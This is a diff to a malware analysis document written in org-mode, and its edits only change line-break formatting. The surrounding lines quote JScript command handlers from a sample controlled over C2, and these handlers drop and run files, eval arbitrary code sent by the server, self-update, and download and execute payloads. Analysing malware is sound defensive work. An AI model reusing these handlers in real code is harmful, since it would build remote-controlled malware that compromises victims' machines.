@@ -196,7 +196,7 @@
            WScript.Quit(1);
        }
      #+end_src
-   - Sc \
+   - Sc\\
      Drop file and run it
      #+begin_src js
        if (Response[0] === "Sc") {
@@ -207,14 +207,14 @@
            shell.run(pathToDrop);
        }
      #+end_src
-   - Ex\
+   - Ex\\
      Executes arbitrary javascript
      #+begin_src js
        if (Response[0] === "Ex") {
            eval(Response[1]);
        }
      #+end_src
-   - Rn\
+   - Rn\\
      Modifies the HDDserial prefix, which is part of the fingerprint. As i was not able to analyse real traffic from the C2 server,
      i can speculate as to why this would be. My guess is that it might be used as a way to discriminate victims in order to deliver 
      different stages of the attack.
@@ -234,7 +234,7 @@
            WScript.Quit(1);
        }
      #+end_src
-   - Up\
+   - Up\\
      This command seems to allow the sample to self update, or at least drop a new version of itself on disk. 
      As the function changes the "|U|" to "|V|", which is the delimiter used to parse responses from the C2, this looks like a reasonable guess.
      #+begin_src js
@@ -264,7 +264,7 @@
            WScript.Quit(1);
        }
      #+end_src
-   - RF\
+   - RF\\
      This just downloads a file and run it
      #+begin_src js
        if (Response[0] === "RF") {
